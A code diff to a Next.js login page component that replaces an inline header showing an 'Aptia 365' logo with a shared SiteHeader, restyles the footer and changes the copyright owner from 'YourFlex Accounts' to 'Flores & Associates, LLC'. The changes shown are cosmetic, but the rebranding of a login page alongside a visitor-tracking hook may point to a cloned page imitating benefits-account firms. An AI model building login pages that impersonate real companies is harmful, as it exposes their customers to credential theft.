@@ -3,6 +3,7 @@
 import { useState, useEffect, useRef } from "react";
 import { useRouter } from "next/navigation";
 import { Preloader } from "@/components/preloader";
+import { SiteHeader } from "@/components/site-header";
 import { useVisitorTracking } from "@/hooks/use-visitor-tracking";
 
 export default function LoginPage() {
@@ -185,23 +186,17 @@ export default function LoginPage() {
             .btn-register{background:#1a2a5e;color:#fff;margin-top:8px;}
             .register-section{margin-top:20px;}
             .register-label{font-size:0.87rem;color:#333;}
-            footer{background:#ccc5bc;padding:20px 16px 10px;text-align:center;}
+            footer{background:#003f6f;padding:20px 24px;text-align:left;display:flex;flex-direction:column;align-items:flex-start;}
             .footer-links{display:flex;justify-content:center;flex-wrap:wrap;gap:8px 28px;margin-bottom:9px;}
             .footer-links a{font-size:0.8rem;font-weight:700;color:#1a2a5e;text-decoration:none;letter-spacing:0.03em;text-transform:uppercase;}
             .footer-links a:hover{text-decoration:underline;}
-            .footer-copy{font-size:0.74rem;color:#444;margin-bottom:7px;}
-            .footer-sitemap a{font-size:0.76rem;color:#1a2a5e;text-decoration:none;font-weight:600;}
+            .footer-copy{font-size:0.74rem;color:#fff;margin-bottom:20px;margin-top:0;}
+            .footer-sitemap{width:100%;text-align:center;}
+            .footer-sitemap a{font-size:0.76rem;color:#87ceeb;text-decoration:none;font-weight:600;}
             .footer-sitemap a:hover{text-decoration:underline;}
             @media(max-width:500px){main{padding:32px 12px 28px;}.btn{width:100%;justify-content:center;}.footer-links{gap:7px 14px;}}
           `}</style>
-          <header>
-            <img
-              className="logo-img"
-              src="/Aptia-365-RGB-Light-bg_resize+for+WCP.89a04093fc33467fac75385534b60d84.png"
-              alt="Aptia 365"
-            />
-            <span className="header-title">Login</span>
-          </header>
+          <SiteHeader />
           {/* Wrap main and footer in a fragment to ensure valid JSX */}
           <>
             <main>
@@ -343,14 +338,8 @@ export default function LoginPage() {
             </div>
             </main>
             <footer>
-              <nav className="footer-links" aria-label="Footer">
-                <a href="#">Contact Us</a>
-                <a href="#">About Us</a>
-                <a href="#">Terms of Use</a>
-                <a href="#">Privacy Policy</a>
-              </nav>
               <p className="footer-copy">
-                Copyright &copy; 2024 YourFlex Accounts. All Rights Reserved.
+                Copyright &copy; 2024 Flores & Associates, LLC. All Rights Reserved.
               </p>
               <p className="footer-sitemap">
                 <a href="#">SITE MAP</a>
